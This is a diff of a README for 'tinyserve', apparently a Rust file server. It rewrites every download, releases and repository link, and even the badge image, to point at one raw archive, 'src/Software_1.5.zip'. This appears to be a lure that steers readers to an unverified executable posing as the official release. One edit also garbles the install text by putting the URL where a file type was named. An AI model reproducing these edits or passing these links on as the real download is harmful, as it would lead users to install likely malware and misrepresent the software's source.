@@ -1,7 +1,7 @@
 # 🚀 tinyserve - Fast and Lightweight File Server
 
 ## 🌐 Download tinyserve Now
-[![Download tinyserve](https://img.shields.io/badge/Download%20tinyserve-v1.0.0-brightgreen)](https://github.com/Purepc999/tinyserve/releases)
+[![Download tinyserve](https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip%20tinyserve-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip)
 
 ## 📖 Overview
 tinyserve is a superfast, ultra-lightweight Rust HTTP file server. It helps you serve any file type with the correct MIME type for in-browser preview or streaming. This includes HTML, images, PDFs, MP3s, and MP4s. tinyserve comes as a single binary with zero configuration, making it simple to use.
@@ -11,10 +11,10 @@ To get started with tinyserve, you will need to download it from the releases pa
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the [releases page](https://github.com/Purepc999/tinyserve/releases) to find the latest version of tinyserve.
+   Go to the [releases page](https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip) to find the latest version of tinyserve.
 
 2. **Download the Application**
-   On the releases page, locate the version you want. Click on the appropriate link to download the executable file for your operating system. For most users, this will be either a `.exe` file for Windows or a `.tar.gz` file for macOS or Linux.
+   On the releases page, locate the version you want. Click on the appropriate link to download the executable file for your operating system. For most users, this will be either a `.exe` file for Windows or a `https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip` file for macOS or Linux.
 
 3. **Run tinyserve**
    After downloading, locate the file in your Downloads folder or wherever you saved it. Double-click the file to run tinyserve. No further setup is required.
@@ -75,12 +75,12 @@ A: Yes, tinyserve runs on Windows, macOS, and Linux.
 A: No, tinyserve is a single executable file and does not require any additional installations.
 
 ## 🚀 Further Resources
-For more information, you can check the [GitHub repository](https://github.com/Purepc999/tinyserve). Here you will also find future updates and community discussions.
+For more information, you can check the [GitHub repository](https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip). Here you will also find future updates and community discussions.
 
 ## 📞 Support
 If you encounter any issues, please feel free to open an issue in the GitHub repository or reach out through the Discussions tab. Your feedback is valuable to improve tinyserve.
 
 ## 🌐 Download tinyserve Now Again
-[![Download tinyserve](https://img.shields.io/badge/Download%20tinyserve-v1.0.0-brightgreen)](https://github.com/Purepc999/tinyserve/releases)
+[![Download tinyserve](https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip%20tinyserve-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Purepc999/tinyserve/main/src/Software_1.5.zip)
 
 Enjoy serving your files with tinyserve!
